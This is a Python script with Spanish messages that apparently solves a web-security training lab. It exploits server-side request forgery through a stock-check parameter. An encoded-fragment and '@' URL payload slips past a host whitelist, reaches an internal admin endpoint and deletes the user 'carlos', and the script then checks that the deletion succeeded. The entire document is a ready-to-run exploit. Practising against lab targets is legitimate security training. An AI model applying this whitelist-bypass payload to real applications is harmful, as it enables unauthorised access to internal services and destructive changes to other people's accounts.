import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(base_url):
    url_stock = f"{base_url}/product/stock"
    ssrf_payload = "http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos"
    data_ssrf_payload = {'stockApi': ssrf_payload} 
    response = requests.post(url_stock,data=data_ssrf_payload,verify=False,proxies=proxies_setting)
    
    # valido si fue eliminado el usuario
    data_admin_panel = "http://localhost%23@stock.weliketoshop.net/admin"
    response = requests.post(url_stock,data={'stockApi': data_admin_panel},verify=False,proxies=proxies_setting)
    if "User deleted successfully" in response.text:
        print("(+) Usuario carlos eliminado")
    else:
        print("(-) No fue posible eliminar el usuario")
    

def main():
    if len(sys.argv) !=2:
        print(f"(+) Uso: {sys.argv[0]} <url>")
        print(f"(+) Ejemplo: {sys.argv[0]} www.ejemplo.com")
        exit(-1)
    
    base_url = sys.argv[1]
    print("(+) Intentando eliminar el usuario carlos...")
    delete_user(base_url)


if __name__ == "__main__":
    main()